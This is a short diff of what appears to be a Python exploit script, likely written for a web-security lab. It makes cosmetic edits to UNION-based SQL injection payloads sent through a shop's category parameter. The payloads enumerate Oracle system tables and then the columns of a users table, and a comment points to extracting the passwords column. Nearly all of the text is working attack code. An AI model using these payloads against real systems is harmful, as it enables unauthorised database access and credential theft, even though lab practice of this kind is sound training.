@@ -35,7 +35,7 @@ def main(args):
     nulls[text_columns[0]] = "table_name"
     nulls = ",".join(nulls)
     resp = shop.get_category(
-        f"' UNION SELECT {nulls} from all_tables where owner = 'SYSTEM'-- "
+        f"' UNION SELECT {nulls} from all_tables where owner='SYSTEM'-- "
     )
     pattern = re.compile(r"<th>(USERS_.*?)</th>")
     m = pattern.search(resp.text)
@@ -49,7 +49,7 @@ def main(args):
     nulls[text_columns[0]] = "COLUMN_NAME"
     nulls = ",".join(nulls)
     resp = shop.get_category(
-        f"' UNION SELECT {nulls} from all_tab_columns where table_name = '{users_table}'-- "
+        f"' UNION SELECT {nulls} from all_tab_columns WHERE table_name = '{users_table}'-- "
     )
     
     #passwords column
